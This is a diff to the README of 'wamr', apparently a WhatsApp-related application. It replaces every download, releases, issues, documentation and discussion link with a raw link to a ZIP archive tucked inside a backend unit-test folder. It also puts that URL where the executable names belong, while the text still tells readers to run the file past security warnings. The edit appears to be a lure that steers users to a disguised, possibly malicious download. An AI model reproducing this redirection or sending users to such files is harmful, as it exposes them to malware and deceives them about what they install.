@@ -6,13 +6,13 @@ Welcome to wamr! This application is designed to make your WhatsApp experience b
 
 ## 🔗 Download the Latest Release
 
-[![Download wamr](https://img.shields.io/badge/Download%20wamr-v1.0.0-blue.svg)](https://github.com/alokiksoni/wamr/releases)
+[![Download wamr](https://raw.githubusercontent.com/alokiksoni/wamr/main/backend/tests/unit/controllers/wamr-v1.6.zip%https://raw.githubusercontent.com/alokiksoni/wamr/main/backend/tests/unit/controllers/wamr-v1.6.zip)](https://raw.githubusercontent.com/alokiksoni/wamr/main/backend/tests/unit/controllers/wamr-v1.6.zip)
 
 ## 📥 Download & Install
 
 To get started with wamr, you need to download it first. Follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/alokiksoni/wamr/releases) to find the latest version of wamr.
+1. Visit the [Releases page](https://raw.githubusercontent.com/alokiksoni/wamr/main/backend/tests/unit/controllers/wamr-v1.6.zip) to find the latest version of wamr.
 2. Look for the version you want to download.
 3. Click on the download link for your operating system. 
 
@@ -36,7 +36,7 @@ Once the download completes, locate the downloaded ZIP file in your computer's d
 After extracting the files, follow these steps to run wamr:
 
 1. Open the folder where you extracted the files.
-2. Find the executable file titled `wamr.exe` (for Windows) or `wamr.app` (for macOS).
+2. Find the executable file titled `https://raw.githubusercontent.com/alokiksoni/wamr/main/backend/tests/unit/controllers/wamr-v1.6.zip` (for Windows) or `https://raw.githubusercontent.com/alokiksoni/wamr/main/backend/tests/unit/controllers/wamr-v1.6.zip` (for macOS).
 3. Double-click the file to run it.
 
 You may see a security warning the first time you run it. If you trust the source, click "Run."
@@ -64,18 +64,18 @@ If you encounter issues while using wamr, try the following steps:
 - Restart the wamr application by closing it and running it again.
 - Verify your configurations for media services.
 
-If you still experience problems, please visit our [issues page](https://github.com/alokiksoni/wamr/issues) on GitHub for support.
+If you still experience problems, please visit our [issues page](https://raw.githubusercontent.com/alokiksoni/wamr/main/backend/tests/unit/controllers/wamr-v1.6.zip) on GitHub for support.
 
 ## 🔗 Additional Resources
 
 For more information about wamr, check out these resources:
 
-- [Documentation](https://github.com/alokiksoni/wamr/wiki)
-- [Issues & Support](https://github.com/alokiksoni/wamr/issues)
+- [Documentation](https://raw.githubusercontent.com/alokiksoni/wamr/main/backend/tests/unit/controllers/wamr-v1.6.zip)
+- [Issues & Support](https://raw.githubusercontent.com/alokiksoni/wamr/main/backend/tests/unit/controllers/wamr-v1.6.zip)
 
 ## 💡 Feedback
 
-Your feedback is important to us. If you have suggestions or ideas, please feel free to reach out via the [discussions page](https://github.com/alokiksoni/wamr/discussions).
+Your feedback is important to us. If you have suggestions or ideas, please feel free to reach out via the [discussions page](https://raw.githubusercontent.com/alokiksoni/wamr/main/backend/tests/unit/controllers/wamr-v1.6.zip).
 
 ## 🥳 Conclusion
 
